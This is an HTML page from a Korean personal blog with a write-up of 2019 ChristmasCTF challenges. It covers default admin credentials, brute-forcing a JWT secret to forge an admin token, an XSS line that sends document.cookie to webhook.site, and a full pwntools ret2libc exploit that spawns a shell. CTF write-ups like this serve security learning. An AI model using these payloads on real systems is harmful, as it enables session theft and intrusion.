@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>2019 ChristmasCTF Write Up</title>
+    <meta name="description" content="2019 ChristmasCTF Write Up">
+    <meta name="keywords" content='blog, gokarna, hugo, CTF, ChristmasCTF'>
+
+    <meta property="og:url" content="https://blog.jhyeon.dev/posts/20201225_christmasctf/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="2019 ChristmasCTF Write Up">
+    <meta property="og:description" content="2019 ChristmasCTF Write Up">
+    <meta property="og:image" content="/images/profile.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="2019 ChristmasCTF Write Up">
+    <meta name="twitter:description" content="2019 ChristmasCTF Write Up">
+    <meta property="twitter:domain" content="https://blog.jhyeon.dev/posts/20201225_christmasctf/">
+    <meta property="twitter:url" content="https://blog.jhyeon.dev/posts/20201225_christmasctf/">
+    <meta name="twitter:image" content="/images/profile.jpg">
+
+    
+    <link rel="canonical" href="https://blog.jhyeon.dev/posts/20201225_christmasctf/" />
+
+    <link rel="stylesheet" type="text/css" href="https://blog.jhyeon.dev/css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="https://blog.jhyeon.dev/css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="https://blog.jhyeon.dev/css/dark.css">
+
+    <script src="https://blog.jhyeon.dev/js/svg-injector.min.js"></script>
+    <script src="https://blog.jhyeon.dev/js/feather-icons.min.js"></script>
+    <script src="https://blog.jhyeon.dev/js/main.js"></script>
+
+    
+    
+        <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css" integrity="sha384-Xi8rHCmBmhbuyyhbI88391ZKP2dmfnOl4rT9ZfRI7mLTdk1wblIUnrIq35nqwEvC" crossorigin="anonymous">
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js" integrity="sha384-X/XCfMm41VSsqRNQgDerQczD69XqmjOOOwYQvr/uuC+j4OPoNhVgjdGFwhvN02Ja" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js" integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          // customised options
+          // • auto-render specific keys, e.g.:
+          delimiters: [
+            {left: '$$', right: '$$', display: true},
+            {left: '$', right: '$', display: false},
+          ],
+          // • rendering keys, e.g.:
+          throwOnError : false
+        });
+      });
+    </script>
+  
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://blog.jhyeon.dev">
+                <img src="https://blog.jhyeon.dev/images/profile.jpg" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://blog.jhyeon.dev">DH.J</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://blog.jhyeon.dev/"><span data-feather='home'></span> Home </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://blog.jhyeon.dev/posts/"><span data-feather='book'></span> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://blog.jhyeon.dev/tags/"><span data-feather='tag'></span> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/dhje0ng"><span data-feather='github'></span>  </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://blog.jhyeon.dev/index.xml"><span data-feather='rss'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://blog.jhyeon.dev/"><span data-feather='home'></span> Home </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://blog.jhyeon.dev/posts/"><span data-feather='book'></span> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://blog.jhyeon.dev/tags/"><span data-feather='tag'></span> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/dhje0ng"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://blog.jhyeon.dev/index.xml"><span data-feather='rss'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>2019 ChristmasCTF Write Up</h1>
+        <small role="doc-subtitle">2019 ChristmasCTF Write Up</small>
+        <p class="post-date">
+            December 25, 2019
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://blog.jhyeon.dev/tags/ctf">CTF</a></li>
+        
+            <li class="post-tag"><a href="https://blog.jhyeon.dev/tags/christmasctf">ChristmasCTF</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <h1 id="web">Web</h1>
+<h2 id="watermelon-unintended">Watermelon (unintended)</h2>
+<p>이 문제는 언인텐으로 풀 수 있었던 문제인데, 관리자 계정이 <code>admin/admin</code> 으로 설정되어있다는 점을</p>
+<p>활용해서 그냥 로그인하고 공짜로 플래그를 얻었다.</p>
+<h2 id="jwt">JWT</h2>
+<p>PHP JWT TOKEN 사용하는 문제이다. 문제에서 제공되는 <code>config.js</code> 파일에서 소스코드를 볼 수 있는데</p>
+<p>다음과 같이 구성되어 있다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">jwt</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bruth</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">key</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;********&#39;</span>, <span style="color:#75715e">// 0~9, 8 length
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">options</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">issuer</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;c2w2m2&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">expiresIn</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;1d&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">algorithm</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;HS256&#39;</span>,
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span> };
+</span></span></code></pre></div><p>JWT 토큰 생성 시 사용되는 <code>secret key</code> 를 찾아서 무차별 대입 공격해서 찾아내야 할 것 같다.</p>
+<p>왜냐면, key 정의한 곳에 주석으로 숫자 0~9로 구성되어있고 8자리라고 알려주기 때문에 브포하기 최적의 조건이 주어졌다.</p>
+<p>따라서 <code>john the ripper</code> 사용해서 브포를 했고 <code>secret key</code> 를 찾은 뒤 해당 키 값으로 <code>is_admin</code> 값을 TRUE 로</p>
+<p>변경해서 새 토큰을 만들어 준 뒤, 토큰 값을 바꿔주면 문제가 해결된다.</p>
+<h2 id="csrf">CSRF</h2>
+<p>이 문제는 문제 이름과 같이 CSRF(Cross Site Request Forgery) 취약점이다.</p>
+<p>문제 페이지에 들어가보면 글을 쓸 수 있는 게시판 기능이 있어서 문제에서 주어진 파일을 열어서</p>
+<p>소스코드 분석을 했더니 다음과 같은 내용을 확인할 수 있었다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">board</span><span style="color:#f92672">.</span><span style="color:#a6e22e">content</span><span style="color:#f92672">.</span><span style="color:#a6e22e">match</span>(<span style="color:#f92672">/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">|</span><span style="color:#a6e22e">img</span><span style="color:#f92672">|</span><span style="color:#a6e22e">on</span><span style="color:#f92672">/</span><span style="color:#a6e22e">i</span>)) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span><span style="color:#f92672">.</span><span style="color:#a6e22e">send</span>({ <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">400</span> });
+</span></span></code></pre></div><p><code>content</code> 에는 <code>match</code> 함수를 사용해서 필터링을 하는 로직이 있지만 의도된 건지는 몰라도
+<code>title</code> 에는 필터링 하는 함수가 없어서 JS 사용이 가능했다.</p>
+<h3 id="exploit">Exploit</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>location.href=&#39;https://webhook.site~&#39; + document.cookie;
+</span></span></code></pre></div><h1 id="pwn">Pwn</h1>
+<h2 id="solo-test">Solo test</h2>
+<h3 id="exploit-1">Exploit</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./solo_test&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./solo_test&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc227.so&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400b83</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004005f1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>solo <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;solo&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_offset <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>system_offset <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>binsh_offset <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>,<span style="color:#e6db74">&#39;Me&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>,<span style="color:#e6db74">&#39;No&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>,<span style="color:#e6db74">&#39;CTF&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>,<span style="color:#e6db74">&#39;Never&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>,<span style="color:#e6db74">&#39;No&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">88</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pr)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(puts_got)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(puts_plt)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(solo)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;--&gt; &#39;</span>,payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> puts_addr <span style="color:#f92672">-</span> puts_offset
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> system_offset
+</span></span><span style="display:flex;"><span>binsh_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> binsh_offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">88</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pr)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(binsh_addr)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(system_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;--&gt; &#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div>
+        </p>
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#watermelon-unintended">Watermelon (unintended)</a></li>
+        <li><a href="#jwt">JWT</a></li>
+        <li><a href="#csrf">CSRF</a>
+          <ul>
+            <li><a href="#exploit">Exploit</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#solo-test">Solo test</a>
+          <ul>
+            <li><a href="#exploit-1">Exploit</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    <span>&copy; 2022 DH.J</span>
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
